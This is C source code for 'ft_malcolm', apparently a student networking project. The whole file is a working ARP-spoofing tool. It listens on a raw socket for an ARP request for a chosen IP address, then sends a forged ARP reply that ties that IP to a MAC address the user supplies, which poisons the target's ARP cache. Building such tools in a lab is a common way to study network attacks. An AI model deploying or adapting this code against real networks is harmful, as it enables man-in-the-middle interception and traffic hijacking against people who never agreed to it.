#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <linux/if_packet.h>
#include <ctype.h>
#include <netdb.h>

volatile int keep_running = 1;

void handle_sigint(int sig)
{
    (void)sig;
    printf("\nReceived SIGINT, exiting program...\n");
    keep_running = 0;
}

int is_decimal_ip(const char *ip)
{
    for (int i = 0; ip[i]; i++)
    {
        if (!isdigit(ip[i]))
            return 0;
    }
    return 1;
}

void validate_input(int argc, char **argv)
{
    if (argc != 5)
    {
        fprintf(stderr, "Usage: %s <source IP/hostname> <source MAC> <target IP/hostname> <target MAC>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    struct in_addr src_ip, tgt_ip;

    if (is_decimal_ip(argv[1]))
    {
        unsigned long decimal_ip = strtoul(argv[1], NULL, 10);
        src_ip.s_addr = htonl(decimal_ip);
    }
    else
    {
        struct hostent *he_src = gethostbyname(argv[1]);
        if (!he_src || he_src->h_addrtype != AF_INET)
        {
            fprintf(stderr, "ft_malcolm: invalid source IP or hostname: %s\n", argv[1]);
            exit(EXIT_FAILURE);
        }
        memcpy(&src_ip, he_src->h_addr, sizeof(struct in_addr));
    }

    if (is_decimal_ip(argv[3]))
    {
        unsigned long decimal_ip = strtoul(argv[3], NULL, 10);
        tgt_ip.s_addr = htonl(decimal_ip);
    }
    else
    {
        struct hostent *he_tgt = gethostbyname(argv[3]);
        if (!he_tgt || he_tgt->h_addrtype != AF_INET)
        {
            fprintf(stderr, "Invalid target IP or hostname: %s\n", argv[3]);
            exit(EXIT_FAILURE);
        }
        memcpy(&tgt_ip, he_tgt->h_addr, sizeof(struct in_addr));
    }

    if (!ether_aton(argv[2]))
    {
        fprintf(stderr, "ft_malcolm: invalid source MAC address: %s\n", argv[2]);
        exit(EXIT_FAILURE);
    }
    if (!ether_aton(argv[4]))
    {
        fprintf(stderr, "ft_malcolm: invalid target MAC address: %s\n", argv[4]);
        exit(EXIT_FAILURE);
    }

    static char src_ip_str[INET_ADDRSTRLEN];
    static char tgt_ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &src_ip, src_ip_str, sizeof(src_ip_str));
    inet_ntop(AF_INET, &tgt_ip, tgt_ip_str, sizeof(tgt_ip_str));

    argv[1] = src_ip_str;
    argv[3] = tgt_ip_str;
}

void listen_for_arp_request(const char *src_ip, const char *iface)
{
    int sockfd;
    unsigned char buffer[65536];
    struct sockaddr_ll addr;
    socklen_t addr_len = sizeof(addr);

    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
    {
        fprintf(stderr, "ft_malcolm: Socket creation failed");
        exit(EXIT_FAILURE);
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0)
    {
        fprintf(stderr, "ft_malcolm: failed to get interface index\n");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Waiting for ARP request for %s on interface %s...\n", src_ip, iface);

    while (keep_running)
    {
        fd_set fds;
        struct timeval timeout;

        FD_ZERO(&fds);
        FD_SET(sockfd, &fds);

        timeout.tv_sec = 0;
        timeout.tv_usec = 500000; // 500 ms

        int ret = select(sockfd + 1, &fds, NULL, NULL, &timeout);

        if (ret < 0)
        {
            if (keep_running == 0)
            {
                break;
            }
            fprintf(stderr, "ft_malcolm: select failed\n");
            close(sockfd);
            exit(EXIT_FAILURE);
        }
        else if (ret == 0)
        {
            continue;
        }

        int nbytes = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&addr, &addr_len);
        if (nbytes < 0)
        {
            fprintf(stderr, "Failed to receive ARP packet\n");
            continue;
        }

        /* is ARP packet? */
        struct ether_header *eth_hdr = (struct ether_header *)buffer;
        if (ntohs(eth_hdr->ether_type) != ETH_P_ARP)
            continue;

        /* is ARP request? */
        struct ether_arp *arp_hdr = (struct ether_arp *)(buffer + sizeof(struct ether_header));
        if (ntohs(arp_hdr->ea_hdr.ar_op) != ARPOP_REQUEST)
            continue;

        /* is the ARP request for the ip we trying to spoof? */
        char arp_tpa[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, arp_hdr->arp_tpa, arp_tpa, sizeof(arp_tpa));

        if (strcmp(arp_tpa, src_ip) == 0)
        {
            /* It is! */
            printf("Received ARP request for %s\n", src_ip);
            break;
        }
    }

    close(sockfd);
}



void send_arp_reply(const char *src_ip, const char *src_mac, const char *tgt_ip, const char *tgt_mac, const char *iface)
{
    int sockfd;
    unsigned char buffer[42];

    struct ether_header *eth_hdr = (struct ether_header *)buffer;
    struct ether_arp *arp_hdr = (struct ether_arp *)(buffer + sizeof(struct ether_header));

    struct sockaddr_ll socket_address = {0};

    /* create socket */
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
    {
        fprintf(stderr, "ft_malcolm: Socket creation failed");
        exit(EXIT_FAILURE);
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0)
    {
        fprintf(stderr, "ft_malcolm: failed to get interface index\n");
        exit(EXIT_FAILURE);
    }
    socket_address.sll_ifindex = ifr.ifr_ifindex;
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, ether_aton(tgt_mac)->ether_addr_octet, ETH_ALEN);

    memset(buffer, 0, sizeof(buffer));

    memcpy(eth_hdr->ether_shost, ether_aton(src_mac)->ether_addr_octet, ETH_ALEN);
    memcpy(eth_hdr->ether_dhost, ether_aton(tgt_mac)->ether_addr_octet, ETH_ALEN);
    eth_hdr->ether_type = htons(ETH_P_ARP);

    arp_hdr->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_hdr->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp_hdr->ea_hdr.ar_hln = ETH_ALEN;
    arp_hdr->ea_hdr.ar_pln = 4;
    arp_hdr->ea_hdr.ar_op = htons(ARPOP_REPLY);

    memcpy(arp_hdr->arp_sha, ether_aton(src_mac)->ether_addr_octet, ETH_ALEN);
    inet_pton(AF_INET, src_ip, arp_hdr->arp_spa);
    memcpy(arp_hdr->arp_tha, ether_aton(tgt_mac)->ether_addr_octet, ETH_ALEN);
    inet_pton(AF_INET, tgt_ip, arp_hdr->arp_tpa);

    if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0)
    {
        fprintf(stderr, "ft_malcolm: failed to send ARP reply\n");
        exit(EXIT_FAILURE);
    }

    printf("Sent ARP reply packet\n");
    close(sockfd);
}

int main(int argc, char **argv)
{
    signal(SIGINT, handle_sigint);

    validate_input(argc, argv);

    char *src_ip = argv[1];
    char *src_mac = argv[2];
    char *tgt_ip = argv[3];
    char *tgt_mac = argv[4];
    char iface[IFNAMSIZ] = "eth0";

    printf("Listening for ARP requests on interface: %s\n", iface);

    listen_for_arp_request(src_ip, iface);

    if (keep_running)
        send_arp_reply(src_ip, src_mac, tgt_ip, tgt_mac, iface);

    printf("Exiting program...\n");
    return 0;
}
